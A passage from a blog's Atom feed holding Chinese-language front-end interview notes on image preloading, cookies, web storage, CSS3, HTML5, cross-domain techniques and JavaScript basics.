= url;</div><div class="line"></div><div class="line">               <span class="comment">// 如果图片被缓存，则直接返回缓存数据    </span></div><div class="line">               <span class="keyword">if</span> (img.complete) &#123;</div><div class="line">                   ready.call(img);</div><div class="line">                   load &amp;&amp; load.call(img);</div><div class="line">                   <span class="keyword">return</span>;</div><div class="line">               &#125;;</div><div class="line"></div><div class="line">               width = img.width;</div><div class="line">               height = img.height;</div><div class="line"></div><div class="line">               <span class="comment">// 加载错误后的事件    </span></div><div class="line">               img.onerror = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                   error &amp;&amp; error.call(img);</div><div class="line">                   onready.end = <span class="literal">true</span>;</div><div class="line">                   img = img.onload = img.onerror = <span class="literal">null</span>;</div><div class="line">               &#125;;</div><div class="line"></div><div class="line">               <span class="comment">// 图片尺寸就绪    </span></div><div class="line">               onready = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                   newWidth = img.width;</div><div class="line">                   newHeight = img.height;</div><div class="line">                   <span class="keyword">if</span> (newWidth !== width || newHeight !== height ||</div><div class="line">                       <span class="comment">// 如果图片已经在其他地方加载可使用面积检测    </span></div><div class="line">                       newWidth * newHeight &gt; <span class="number">1024</span></div><div class="line">                   ) &#123;</div><div class="line">                       ready.call(img);</div><div class="line">                       onready.end = <span class="literal">true</span>;</div><div class="line">                   &#125;;</div><div class="line">               &#125;;</div><div class="line">               onready();</div><div class="line"></div><div class="line">               <span class="comment">// 完全加载完毕的事件    </span></div><div class="line">               img.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                   <span class="comment">// onload在定时器时间差范围内可能比onready快    </span></div><div class="line">                   <span class="comment">// 这里进行检查并保证onready优先执行    </span></div><div class="line">                   !onready.end &amp;&amp; onready();</div><div class="line"></div><div class="line">                   load &amp;&amp; load.call(img);</div><div class="line"></div><div class="line">                   <span class="comment">// IE gif动画会循环执行onload，置空onload即可    </span></div><div class="line">                   img = img.onload = img.onerror = <span class="literal">null</span>;</div><div class="line">               &#125;;</div><div class="line"></div><div class="line">               <span class="comment">// 加入队列中定期执行    </span></div><div class="line">               <span class="keyword">if</span> (!onready.end) &#123;</div><div class="line">                   list.push(onready);</div><div class="line">                   <span class="comment">// 无论何时只允许出现一个定时器，减少浏览器性能损耗    </span></div><div class="line">                   <span class="keyword">if</span> (intervalId === <span class="literal">null</span>) intervalId = setInterval(tick, <span class="number">40</span>);</div><div class="line">               &#125;;</div><div class="line">           &#125;;</div><div class="line">       &#125;)();</div></pre></td></tr></table></figure>
<p>代码取自腾讯图片详情页。这种做法仅适用于 img 元素的 src 属性是一个 URL 的情况，如果是 <a href="http://blog.csdn.net/zdy0_2004/article/details/50370107" target="_blank" rel="noopener">Data URI </a>则不能这么做，因为浏览器是另外一套处理逻辑了。</p>
<h3 id="图片预加载与懒加载"><a href="#图片预加载与懒加载" class="headerlink" title="图片预加载与懒加载"></a>图片预加载与懒加载</h3><p><a href="http://www.zhangxinxu.com/wordpress/2016/06/image-preload-based-on-user-behavior/" target="_blank" rel="noopener">基于用户行为的图片等资源预加载–张鑫旭</a></p>
<p>预加载和懒加载的区别，懒加载当用户触发到某块内容区后才去加载，预加载是用户行为还没发生，资源已经加载完毕。</p>
<p><a href="https://www.cnblogs.com/jiekk/p/5687720.html" target="_blank" rel="noopener">实现图片预加载的三大方法</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Web方面的知识盲区补漏。&lt;br&gt;
    
    </summary>
    
      <category term="面试题" scheme="http://yoursite.com/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
    
      <category term="面试题" scheme="http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>【interview questions about JS】 from牛客网</title>
    <link href="http://yoursite.com/2018/02/27/interview-questions-about-JS/"/>
    <id>http://yoursite.com/2018/02/27/interview-questions-about-JS/</id>
    <published>2018-02-27T08:35:38.000Z</published>
    <updated>2018-05-29T02:40:01.808Z</updated>
    
    <content type="html"><![CDATA[<p>来自牛客网<a href="https://www.nowcoder.com/ta/front-end-interview?query=&amp;asc=true&amp;order=&amp;page=1" target="_blank" rel="noopener">前端面试经典题目合集</a> 篇学习总结。<br><a id="more"></a></p>
<h3 id="Cookie的弊端"><a href="#Cookie的弊端" class="headerlink" title="Cookie的弊端"></a>Cookie的弊端</h3><p>cookie虽然在持久保存客户端数据提供了方便，分担了服务器存储的负担，但还是有很多局限性的。<br><strong>优点：</strong><br>1) 数据持久性。<br>2) 不需要任何服务器资源。 Cookie 存储在客户端并在发送后由服务器读取。<br>3) 可配置到期规则。 控制 cookie 的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的 cookie 。<br>4) 简单性。 基于文本的轻量结构。<br>5) 通过良好的编程，控制保存在 cookie 中的 session 对象的大小。<br>6) 通过加密和安全传输技术（ SSL ），减少 cookie 被破解的可能性。<br>7) 只在 cookie 中存放不敏感数据，即使被盗也不会有重大损失。<br><strong>缺点：</strong><br>1) Cookie 数量和长度的限制 。<br>数量：每个域的 cookie 总数有限。</p>
<pre><code>a) IE6 或更低版本最多 20 个 cookie
b) IE7 和之后的版本最后可以有 50 个 cookie
c) Firefox 最多 50 个 cookie
d) chrome 和 Safari 没有做硬性限制
</code></pre><p>长度：每个 cookie 长度不超过 4KB （ 4096B ），否则会被截掉。<br>2) 潜在的安全风险。 Cookie 可能被拦截、篡改。如果 cookie 被拦截，就有可能暴露所有的 session 信息。<br>3)额外开销。  cookie 在每次发起 HTTP 请求的时候都会被发送给服务器，一些不需要的信息也有可能会被发送，会增加开销。<br>4) 用户配置为禁用 。有些用户禁用了浏览器或客户端设备接受 cookie 的能力，因此限制了这一功能。<br>5) 有些状态不可能保存在客户端 。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</p>
<h3 id="浏览器本地存储"><a href="#浏览器本地存储" class="headerlink" title="浏览器本地存储"></a>浏览器本地存储</h3><p>1)Cookie ：广泛应用，局限明显。支持数据存储量相对较少，每个 domain 最多只能有 20 条 cookie ，每个 cookie 长度不能超过 4KB ，否则会被截掉；同时，存在安全性问题，如果被拦截，就可以取得所有的 session 信息。<br>2)Flash SharedObject ：使用的是 kissy 的 store 模块来调用 Flash SharedObject 。<br>优点：容量适中，基本上不存在兼容性问题<br>缺点：要在页面中引入特定的 Flash 和 JS ，增加额外负担，处理繁琐；还是有部分机子没有 flash 运行环境。<br>3)Google Gears ：  Google 的离线方案，已经停止更新，官方推荐使用 HTML5 的 localStorage 方案。<br>4)User Data ：   是微软为 IE 专门在系统中开辟的一块存储空间，只支持 Windows+IE 的组合。单个文件的大小限制是 128KB ，一个域名下总共可以保存 1024KB 的文件，文件个数应该没有限制。在受限站点里这两个值分别是 64KB 和 640KB 。（所以如果考虑到各种情况的话，单个文件最好能控制 64KB 以下。）<br>（实际测试 2000(IE5.5)、 XP(IE6 、 IE7)， Vista(IE7)下都是可正常使用。）<br>5)indexedDB : indexedDB是适合在本地存储大量非关系型数据（NOSQL），采取的是事件+异步回调进行操作。<br><strong>6)Web Storage</strong><br>在较高版本的浏览器中， JS 提供了 sessionStorage 和 globalStorage 。在 HTML5 中提供了 sessionStorage 和 <strong>localStorage</strong> 。<br>sessionStorage 用于本地存储一个会话（ session ）中的数据，这些数据只有在同一个会话中的页面才能访问，会话结束后数据随之销毁。因此 sessionStorage 不是一种持久化的本地存储，仅仅是会话级别的存储。<br>globalStorage 跨越会话存储数据。有特定访问限制，要指定哪些域可访问该数据。</p>
<p><strong>localStorage</strong> 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。不能给 localStorage 指定任何规则，要访问同一个 localStorage ，页面必须使用同一个域名，使用同一种协议，在同一个端口上，即要求同源，不能跨域。</p>
<p>优点：容量大、易用、强大、原生支持<br>缺点： a) 兼容性差（ Chrome,Safari,Firefox,Opera,IE8+ 支持 ， IE8 以下版本不支持）<br>b) 安全性差（所以请勿使用 localStorage 保存敏感信息）<br>c)跨域限制<br>用途：<br>localStorage 可以利用持久化数据本地存储的特点来做网站优化，把一些静态资源，存储在本地，但是这个意义对PC端可能相对小一些，PC端的网速一般比较理想，读取本地localStorage的消耗 和读取服务器的消耗优化不了多少，而且存在本地localstorage的维护成本，总体性价比一般，移动端是可以利用这一点做一些优化，移动端的网络环境还是没达到理想，所以读取localstorage的代价应该小于服务器加载。 </p>
<h3 id="Web-Storage-与-Cookie-的区别"><a href="#Web-Storage-与-Cookie-的区别" class="headerlink" title="Web Storage 与 Cookie 的区别"></a>Web Storage 与 Cookie 的区别</h3><p>1 、 Web Storage 中的数据仅在存在本地，不与服务器发生交互。Cookie 中的数据会在浏览器和服务器中来回传递。<br>2 、 Web Storage 存储空间更大，可以达到 5M。Cookie 数据大小不超过 4KB 。<br>3 、 Web Storage 提供更多丰富易用的接口，如 setItem ， getItem ， removeItem ， clear 等方法，操作数据更方便。Cookie 需要自己封装方法。<br>4 、 cookie 需要指定作用域，不可以跨域调用，同样Web Storage 也存在跨域问题。<br>5、 cookie 中的数据在过期时间之前均有效， Web Storage 则不同， sessionStorage 中的数据在当前浏览器窗口关闭后自动删除， localStorage持久存储数据，除非主动删除数据。</p>
<p>注： 但 Cookie 是不可以或缺的，Cookie 的作用是与服务器进行交互，作为 HTTP 规范的一部分而存在 ，而 Web Storage 仅仅是为了在本地 “ 存储 ” 数据而生。</p>
<h3 id="position的absolute与fixed共同点与不同点"><a href="#position的absolute与fixed共同点与不同点" class="headerlink" title="position的absolute与fixed共同点与不同点"></a>position的absolute与fixed共同点与不同点</h3><p>共同点：<br>1.改变行内元素的呈现方式，display被置为inline-block；<br>2.让元素脱离普通流，不占据空间；<br>3.默认会覆盖到非定位元素上</p>
<p>不同点：<br>absolute的“根元素”是可以设置的，在父元素上设定定位relative；而fixed的“根元素”固定为浏览器窗口。<br>当滚动网页，fixed元素与浏览器窗口之间的距离是不变的。</p>
<h3 id="CSS-哪些属性可以继承-CSS3新增伪类"><a href="#CSS-哪些属性可以继承-CSS3新增伪类" class="headerlink" title="CSS 哪些属性可以继承? CSS3新增伪类?"></a>CSS 哪些属性可以继承? CSS3新增伪类?</h3><p>可继承的样式：<br>1.font-size<br>2.font-family<br>3.color<br>4.text-indent<br>不可继承的样式：<br>1.border<br>2.padding<br>3.margin<br>4.width<br>5.height<br>CSS3新增伪类举例：</p>
<pre><code>p:first-of-type 选择属于其父元素的首个 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。
p:last-of-type  选择属于其父元素的最后 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。
p:only-of-type  选择属于其父元素唯一的 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。
p:only-child    选择属于其父元素的唯一子元素的每个 &lt;p&gt; 元素。
p:nth-child(2)  选择属于其父元素的第二个子元素的每个 &lt;p&gt; 元素。
:enabled :disabled 控制表单控件的禁用状态。
:checked        单选框或复选框被选中。 
</code></pre><h3 id="CSS3的新特性"><a href="#CSS3的新特性" class="headerlink" title="CSS3的新特性"></a>CSS3的新特性</h3><p>答题套路：在我们的项目中经常用CSS3中的XX属性来实现XX特效。</p>
<ol>
<li>CSS3实现圆角（border-radius），阴影（box-shadow）</li>
<li>对文字加特效（text-shadow、），线性渐变（gradient）</li>
<li>transform变换: rotate(9deg); scale(0.85,0.90); translate(0px,-30px); skew(-9deg,0deg) // 旋转,缩放,定位,倾斜</li>
<li>动画animation</li>
<li>增加了更多的CSS选择器  多背景 rgba()</li>
<li>在CSS3中唯一引入的伪类是 ::selection.</li>
<li>媒体查询，多栏布局</li>
<li>border-image</li>
</ol>
<h3 id="CSS-sprites-的理解及使用"><a href="#CSS-sprites-的理解及使用" class="headerlink" title="CSS sprites 的理解及使用"></a>CSS sprites 的理解及使用</h3><p>CSS Sprites 其实就是把网页中一些背景图片整合到一张图片文件中，再利用 CSS 的”background-image”，”background-repeat”，”background-position” 的组合进行背景定位，background-position 可以用数字能精确的定位出背景图片的位置。这样可以减少很多图片请求的开销，因为请求耗时比较长；请求虽然可以并发，但是也有限制，一般浏览器都是6个。对于未来而言，就不需要这样做了，因为有了 http2。 </p>
<p>HTTP/1.x 有个问题叫线端阻塞(head-of-line blocking), 它是指一个连接(connection)一次只提交一个请求的效率比较高, 多了就会变慢。 HTTP/1.1 试过用流水线(pipelining)来解决这个问题, 但是效果并不理想(数据量较大或者速度较慢的响应, 会阻碍排在他后面的请求). 此外, 由于网络媒介(intermediary )和服务器不能很好的支持流水线, 导致部署起来困难重重。<br>而多路传输(Multiplexing)能很好的解决这些问题, 因为它能同时处理多个消息的请求和响应; 甚至可以在传输过程中将一个消息跟另外一个掺杂在一起。 所以客户端只需要一个连接就能加载一个页面。<br>参见博客<a href="http://www.sohu.com/a/161201715_714863" target="_blank" rel="noopener">HTTP1.0、HTTP1.1和HTTP2.0的区别</a>。</p>
<h3 id="Doctype文档类型"><a href="#Doctype文档类型" class="headerlink" title="Doctype文档类型"></a>Doctype文档类型</h3><ol>
<li>该标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。</li>
<li>HTML 4.01 规定了三种文档类型：Strict、Transitional 以及 Frameset。</li>
<li>XHTML 1.0 规定了三种 XML 文档类型：Strict、Transitional 以及 Frameset。</li>
<li>Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页，而 Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。</li>
</ol>
<h3 id="HTML与XHTML之间的区别"><a href="#HTML与XHTML之间的区别" class="headerlink" title="HTML与XHTML之间的区别"></a>HTML与XHTML之间的区别</h3><p>1、XHTML 元素必须被正确地嵌套，不正确嵌套会报错。<br>错误：<code>&lt;p&gt;&lt;span&gt;this is example.&lt;/p&gt;&lt;/span&gt;</code><br>正确：<code>&lt;p&gt;&lt;span&gt;this is example.&lt;/span&gt;&lt;/p&gt;</code><br>而html不被正确嵌套也不会报错。<br>2、 XHTML 元素必须被关闭，即使是空标签<code>&lt;/br&gt;</code>，否则报错。而html可以写成<code>&lt;br&gt;</code>而不报错。<br>3、 XHTML 标签名必须用小写字母。html可以大写。<br>4、 XHTML 文档必须拥有根元素html，所有的 XHTML 元素必须被嵌套于 <html> 根元素中。<br>而html不是必须的。</html></p>
<h3 id="DOM操作——怎样添加、移除、移动、复制、创建和查找节点"><a href="#DOM操作——怎样添加、移除、移动、复制、创建和查找节点" class="headerlink" title="DOM操作——怎样添加、移除、移动、复制、创建和查找节点"></a>DOM操作——怎样添加、移除、移动、复制、创建和查找节点</h3><p>1、 创建新节点</p>
<pre><code>createDocumentFragment() // 创建一个DOM片段
createElement() // 创建一个具体的元素
createTextNode() // 创建一个文本节点
</code></pre><p>2、 添加、移除、替换、插入</p>
<pre><code>appendChild()
removeChild()
replaceChild()
insertBefore() // 在已有的子节点前插入一个新的子节点
</code></pre><p>3、查找</p>
<pre><code>getElementsByTagName() // 通过标签名称
getElementsByName() // 通过元素的Name属性的值(IE容错能力较强，会得到一个数组，其中包括id等于name值的)
document.getElementById() // 通过元素Id，唯一性
getElementsByClassName() //通过类名
queryselector()  
querySeletorAll() // (IE67 不支持)
</code></pre><h3 id="html5-的新特性以及新标签的浏览器兼容问题"><a href="#html5-的新特性以及新标签的浏览器兼容问题" class="headerlink" title="html5 的新特性以及新标签的浏览器兼容问题"></a>html5 的新特性以及新标签的浏览器兼容问题</h3><p><strong>新特性：</strong><br>HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。<br>1、拖拽释放(Drag and drop) API<br>2、语义化更好的内容标签（header,nav,footer,aside,article,section）<br>3、 音频、视频API(audio,video)<br>4、 画布(Canvas) API<br>5、 地理(Geolocation) API<br>6、 本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失；<br>7、 sessionStorage 的数据在浏览器关闭后自动删除<br>8、 表单控件，calendar、date、time、email、url、search<br>9、 新的技术webworker, websocket, Geolocation<br><strong>移除的元素：</strong><br>1、 纯表现的元素：basefont，big，center，font, s，strike，tt，u；<br>2、 对可用性产生负面影响的元素：frame，frameset，noframes；<br><strong>支持HTML5新标签：</strong><br> IE8/IE7/IE6支持通过 document.createElement 方法产生的标签，可以利用这一特性让这些浏览器支持 HTML5 新标签，浏览器支持新标签后，还需要添加标签默认的样式（当然最好的方式是直接使用成熟的框架、使用最多的是html5shiv框架）：</p>
<pre><code>&lt;!--[if lt IE 9]&gt; 
&lt;script&gt; src=&quot;http://html5shiv.googlecode.com/svn/trunk/html5.js&quot;&lt;/script&gt; 
&lt;![endif]--&gt; 
</code></pre><p><strong>如何区分：</strong><br>DOCTYPE声明新增的结构元素、功能元素</p>
<h3 id="iframe的优缺点"><a href="#iframe的优缺点" class="headerlink" title="iframe的优缺点"></a>iframe的优缺点</h3><p>优点：<br>1、 解决加载缓慢的第三方内容如图标和广告等的加载问题<br>2、 Security sandbox<br>3、 并行加载脚本<br>4、 重载页面时不需要重载整个页面，只需要重载页面中的一个框架页(减少了数据的传输，增加了网页下载速度)<br>5、 方便制作导航栏<br>缺点：<br>1、 iframe会阻塞主页面的Onload事件<br>2、 即时内容为空，加载也需要时间<br>3、 没有语意<br>4、 会产生很多页面，不容易管理<br>5、 不容易打印<br>6、 浏览器的后退按钮无效<br>7、 代码复杂,无法被一些搜索引擎索引到<br>8、 多数小型的移动设备（PDA 手机）无法完全显示框架<br>9、 多框架的页面会增加服务器的http请求<br>10、 由于上面诸多缺点，因此不符合标准网页设计的理念,已经被标准网页设计抛弃</p>
<h3 id="webSocket-如何兼容低浏览器"><a href="#webSocket-如何兼容低浏览器" class="headerlink" title="webSocket 如何兼容低浏览器"></a>webSocket 如何兼容低浏览器</h3><p>Adobe Flash Socket 、 ActiveX HTMLFile (IE) 、 基于 multipart 编码发送 XHR 、 基于长轮询的 XHR </p>
<h3 id="线程与进程的区别"><a href="#线程与进程的区别" class="headerlink" title="线程与进程的区别"></a>线程与进程的区别</h3><p>进程是系统进行资源分配和调度的一个独立单位。线程是进程的一个实体,是CPU调度和分派的基本单位。<br>1、 一个程序至少有一个进程,一个进程至少有一个线程<br>2、 线程的划分尺度小于进程，使得多线程程序的并发性高<br>3、 另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率<br>4、 线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制<br>5、 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别</p>
<h3 id="如何对网站的文件和资源进行优化"><a href="#如何对网站的文件和资源进行优化" class="headerlink" title="如何对网站的文件和资源进行优化"></a>如何对网站的文件和资源进行优化</h3><p>1、 文件合并<br>2、 文件最小化/文件压缩<br>3、 使用 CDN 托管<br>4、 缓存的使用（多个域名来提供缓存）<br>雅虎军规：<br>1、尽可能减少http请求次数，将css, js, 图片各自合并<br>2、使用CDN，降低通信距离<br>3、添加Expire/Cache-Control头<br>4、启用Gzip压缩文件<br>5、将css放在页面最上面<br>6、将script放在页面最下面<br>7、避免在css中使用表达式<br>8、将css, js都放在外部文件中<br>9、减少DNS查询<br>10、最小化css, js，减小文件体积<br>11、避免重定向<br>12、移除重复脚本<br>13、配置实体标签ETag<br>14、使用AJAX缓存，让网站内容分批加载，局部更新</p>
<h3 id="三种减少页面加载时间的方法"><a href="#三种减少页面加载时间的方法" class="headerlink" title="三种减少页面加载时间的方法"></a>三种减少页面加载时间的方法</h3><p>1、 优化图片<br>2、 图像格式的选择（GIF：提供的颜色较少，可用在一些对颜色要求不高的地方）<br>3、 优化CSS（压缩合并css，如 margin-top, margin-left…)<br>4、 网址后加斜杠（如www.campr.com/目录，会判断这个目录是什么文件类型，或者是目录。）<br>5、 标明高度和宽度（如果浏览器没有找到这两个参数，它需要一边下载图片一边计算大小，如果图片很多，浏览器需要不断地调整页面。这不但影响速度，也影响浏览体验。<br>当浏览器知道了高度和宽度参数后，即使图片暂时无法显示，页面上也会腾出图片的空位，然后继续加载后面的内容。从而加载时间快了，浏览体验也更好了）<br>6、 减少http请求（合并文件，合并图片）CSS精灵，将JS代码写在body后面 </p>
<h3 id="测试JS代码性能的工具"><a href="#测试JS代码性能的工具" class="headerlink" title="测试JS代码性能的工具"></a>测试JS代码性能的工具</h3><p><a href="https://www.zhihu.com/question/20704098" target="_blank" rel="noopener">如何测试javascript代码的性能？—知乎</a><br>1、 浏览器debug中现在都有原生的profile功能，可定位那个函数调用得多，用的时间多，这个可以比较精确定位耗时的函数。<br>2、JSPerf  <a href="http://blog.csdn.net/meloseven/article/details/61615591?utm_source=itdadao&amp;utm_medium=referral" target="_blank" rel="noopener">使用Benchmark.js和jsPerf分析代码性能</a><br>3、 Dromaeo</p>
<p>前端性能测试：<br><strong>Page Speed Online</strong><br>Google Page Speed 是当下很流行的在线测试网站性能工具，基于Google的一套最佳的前端性能的规则，你可以很方便得到大量的性能信息，甚至还提供了移动设备的最佳实践报告<br><strong>WebPagetest</strong><br>WebPagetest 是性能测试的黄金标准，它提供了多方面的量化指标用于性能测试，比如有一个基本的评分，用于评价当前页面优化的水平；有一个截图，显示页面加载后的视觉效果；还有一个浏览器加载资源的瀑布流…<br>根据用户浏览器真实的连接速度，在全球范围内进行网页速度测试，并提供详细的优化建议。<br><a href="http://www.51testing.com/index.php?action-viewnews-itemid-3720205-php-1" target="_blank" rel="noopener">前端性能测试必备工具清单</a><br><a href="https://www.jianshu.com/p/cdf777f13ff6" target="_blank" rel="noopener">前端性能优化和测试工具总结</a><br><a href="http://www.daqianduan.com/3962.html" target="_blank" rel="noopener">推荐10个免费在线测试网页性能工具</a></p>
<h3 id="什么是-FOUC？-如何来避免-FOUC？"><a href="#什么是-FOUC？-如何来避免-FOUC？" class="headerlink" title="什么是 FOUC？ 如何来避免 FOUC？"></a>什么是 FOUC？ 如何来避免 FOUC？</h3><p>FOUC - Flash Of Unstyled Content 文档样式闪烁<br>使用<code>&lt;style type=&quot;text/css&quot; media=&quot;all&quot;&gt;@import &quot;../fouc.css&quot;;&lt;/style&gt;</code> @import导入外部样式文件时，IE会先加载整个HTML文档的DOM，然后再去导入外部的CSS文件，因此，在页面DOM加载完成到CSS导入完成中间会有一段时间页面上的内容是没有样式的，这段时间的长短跟网速，电脑速度都有关系。<br>解决办法：将@import换成link，link是顺序加载，这样页面就会等css下载完之后再下载html文件，这样就先布好了局，所以就不会出现focus闪烁问题。</p>
<h3 id="null和undefined的区别"><a href="#null和undefined的区别" class="headerlink" title="null和undefined的区别"></a>null和undefined的区别</h3><p>null是一个表示”无”的对象，转为数值时为0<br>undefined是一个表示”无”的原始值，转为数值时为NaN</p>
<p>当声明的变量还未被初始化时，变量的默认值为undefined<br>null用来表示尚未存在的对象，常用来表示函数企图返回一个不存在的对象</p>
<p>undefined表示 “缺少值”，就是此处应该有一个值，但是还没有定义。典型用法是：<br>1、 变量被声明了，但没有赋值时，就等于 undefined<br>2、 调用函数时，应该提供的参数没有提供，该参数等于 undefined<br>3、 对象没有赋值的属性，该属性的值为 undefined<br>4、 函数没有返回值时，默认返回 undefined</p>
<p>null表示“没有对象”，即该处不应该有值。典型用法是：<br>1、 作为函数的参数，表示该函数的参数不是对象<br>2、 作为对象原型链的终点</p>
<h3 id="new操作符具体干了什么"><a href="#new操作符具体干了什么" class="headerlink" title="new操作符具体干了什么"></a>new操作符具体干了什么</h3><p>1、 创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型<br>2、 属性和方法被加入到 this 引用的对象中<br>3、 新创建的对象由 this 所引用，并且最后隐式的返回 this</p>
<pre><code>//var obj = new Base();    
var obj  = {};
obj.__proto__ = Base.prototype;
Base.call(obj);
</code></pre><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。它是基于JavaScript的一个子集。数据格式简单, 易于读写, 占用带宽小。<code>{&quot;age&quot;:&quot;12&quot;, &quot;name&quot;:&quot;back&quot;}</code></p>
<pre><code>json.stringify({a:10,b:20}); //json对象转换成字符串 
json.parse(&apos;{&quot;a&quot;:10,&quot;b&quot;:20}&apos;) //字符串转换成json对象
</code></pre><p><a href="http://blog.csdn.net/qq_32528231/article/details/52783210" target="_blank" rel="noopener">博客—对json的理解</a></p>
<h3 id="js延迟加载的方式"><a href="#js延迟加载的方式" class="headerlink" title="js延迟加载的方式"></a>js延迟加载的方式</h3><p>JS延迟加载，也就是等页面加载完成之后再加载 JavaScript 文件。<br>JS延迟加载有助于提高页面加载速度。</p>
<pre><code>defer 属性
async 属性
动态创建DOM方式
使用jQuery的getScript方法
使用setTimeout延迟方法
让JS最后加载
</code></pre><p>1、 defer<br>HTML 4.01 为 <code>&lt;script&gt;</code>标签定义了 defer属性。<br>用途：表明脚本在执行时不会影响页面的构造。也就是说，脚本会被延迟到整个页面都解析完毕之后再执行。<br>defer属性只适用于外部脚本文件。支持 HTML5 的实现会忽略嵌入脚本设置的 defer属性。<br>2、 async<br>HTML5 为 <code>&lt;script&gt;</code>标签定义了 async属性。与defer属性类似，都用于改变处理脚本的行为。同样，只适用于外部脚本文件。<br>目的：不让页面等待脚本下载和执行，从而异步加载页面其他内容。<br>异步脚本一定会在页面 load 事件前执行。<br>不能保证脚本会按顺序执行。<br>3、 动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）<br>4、 按需异步载入js(可以将js文件加载绑定到一个事件上，这样当事件发生时，才会加载相应的js文件)<br><a href="http://blog.csdn.net/meijory/article/details/76389762" target="_blank" rel="noopener">JS延迟加载的几种方式</a></p>
<h3 id="解决跨域问题"><a href="#解决跨域问题" class="headerlink" title="解决跨域问题"></a>解决跨域问题</h3><pre><code>1、 通过jsonp跨域
2、 document.domain + iframe跨域
3、 location.hash + iframe
4、 window.name + iframe跨域
5、 postMessage跨域
6、 跨域资源共享（CORS）
7、 nginx代理跨域
8、 nodejs中间件代理跨域
9、 WebSocket协议跨域
</code></pre><p><a href="https://segmentfault.com/a/1190000011145364" target="_blank" rel="noopener">前端常见跨域解决方案（全）</a><br><a href="https://github.com/shirley5li/cross-domain" target="_blank" rel="noopener">关于跨域的简单demo集合–github</a></p>
<h3 id="documen-write和-innerHTML-的区别"><a href="#documen-write和-innerHTML-的区别" class="headerlink" title="documen.write和 innerHTML 的区别"></a>documen.write和 innerHTML 的区别</h3><p>document.write 只能同步执行，如果在window.onload之前执行则在文档流中绘制内容，如果在window.onload之后则会重绘整个页面（之前内容被冲刷掉）<br>innerHTML 则是绘制某个元素内的内容，没有这个限制 </p>
<h3 id="call-和-apply-的作用"><a href="#call-和-apply-的作用" class="headerlink" title=".call() 和 .apply() 的作用"></a>.call() 和 .apply() 的作用</h3><p>改变上下文，即this的指向。<br>apply:方法能劫持另外一个对象的方法，继承另外一个对象的属性.</p>
<p>Function.apply(obj,args)方法能接收两个参数<br>obj：这个对象将代替Function类里this对象<br>args：这个是数组，它将作为参数传给Function（args–&gt;arguments）</p>
<p>call:和apply的意思一样,只不过是参数列表不一样.</p>
<p>Function.call(obj,[param1[,param2[,…[,paramN]]]])<br>obj：这个对象将代替Function类里this对象<br>params：这个是一个参数列表</p>
<h3 id="哪些操作会造成内存泄漏"><a href="#哪些操作会造成内存泄漏" class="headerlink" title="哪些操作会造成内存泄漏"></a>哪些操作会造成内存泄漏</h3><p>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。<br>垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。 </p>
<ol>
<li>setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。</li>
<li>闭包</li>
<li>全局变量引起的内存泄漏</li>
<li>循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）</li>
<li>dom清空或删除时，事件未清除导致的内存泄漏，脱离 DOM 的引用<br><a href="http://developer.51cto.com/art/201605/511624.htm#topx" target="_blank" rel="noopener">JavaScript内存泄露的4种方式及如何避免</a><br><a href="https://www.cnblogs.com/libin-1/p/6013490.html" target="_blank" rel="noopener">JavaScript常见的内存泄漏原因</a><br><a href="http://www.ruanyifeng.com/blog/2017/04/memory-leak.html" target="_blank" rel="noopener">JavaScript 内存泄漏教程—阮一峰</a></li>
</ol>
<h3 id="如何判断当前脚本运行在浏览器还是node环境中"><a href="#如何判断当前脚本运行在浏览器还是node环境中" class="headerlink" title="如何判断当前脚本运行在浏览器还是node环境中"></a>如何判断当前脚本运行在浏览器还是node环境中</h3><p>通过判断 Global 对象是否为window，如果不为window，当前脚本没有运行在浏览器中。即在node中的全局变量是global ,浏览器的全局变量是window。 可以通过该全局变量是否定义来判断宿主环境。</p>
<pre><code>exports = typeof window === &apos;undefined&apos; ? global : window ;
//获取全局对象的方式
//同理可得，typeof window可以用来判断是不是在浏览器环境中
